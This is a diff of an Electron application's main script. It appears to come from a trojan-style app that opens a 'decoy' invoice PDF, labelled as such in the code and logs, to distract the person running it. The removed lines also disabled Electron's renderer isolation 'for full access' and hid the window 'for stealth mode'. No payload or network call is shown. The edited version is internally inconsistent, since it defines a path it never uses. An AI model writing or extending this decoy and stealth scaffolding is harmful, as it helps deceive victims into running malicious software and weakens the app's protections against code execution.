@@ -1,41 +1,34 @@
-const { app, BrowserWindow, shell } = require("electron");
-const path = require("path");
-const fs = require("fs");
+const { app, BrowserWindow, shell } = require('electron');
+const path = require('path');
+const fs = require('fs');
 
-function createWindow() {
+const createWindow = () => {
   const win = new BrowserWindow({
     width: 800,
     height: 600,
     webPreferences: {
-      // Security features REMOVED for full access:
-      nodeIntegration: true,   // Allow Node.js integration in renderer
-      contextIsolation: false, // Disable context isolation
-      preload: path.join(__dirname, "preload.js"), // Uncomment if needed
-    },
-    show: false, // Set to false for stealth mode
-  });
+      preload: path.join(__dirname, 'preload.js')
+    }
+  })
 
-  win.setMenuBarVisibility(false); // Remove menu bar for cleaner look
-  win.loadFile("index.html");
+  win.loadFile('index.html')
 }
 
-function openDecoyPDF() {
-  // This will point to the "resources/app/assets/invoice.pdf" after packaging,
-  // and "assets/invoice.pdf" in development.
-  const pdfAssetPath = path.join(__dirname, 'assets', 'invoice.pdf');
+const openDecoyPDF = () => {
+  const pdfAssetPath = 'assets/invoice.pdf';
 
   // Check if the file actually exists before trying to open it
-  if (fs.existsSync(pdfAssetPath)) {
-    shell.openPath(pdfAssetPath)
+   if (fs.existsSync('decoy_invoice.pdf')) {
+    shell.openPath('decoy_invoice.pdf')
       .then((err) => {
         if (err) {
-          console.error('[decoy] Could not open invoice.pdf:', err);
+          console.error('[decoy] Could not open decoy_invoice.pdf:', err);
         } else {
-          console.log('[decoy] Decoy invoice.pdf opened successfully.');
+          console.log('[decoy] Decoy invoice opened successfully.');
         }
       });
   } else {
-    console.error('[decoy] invoice.pdf not found at', pdfAssetPath);
+    console.error('[decoy] decoy_invoice.pdf not found');
   }
 }
 
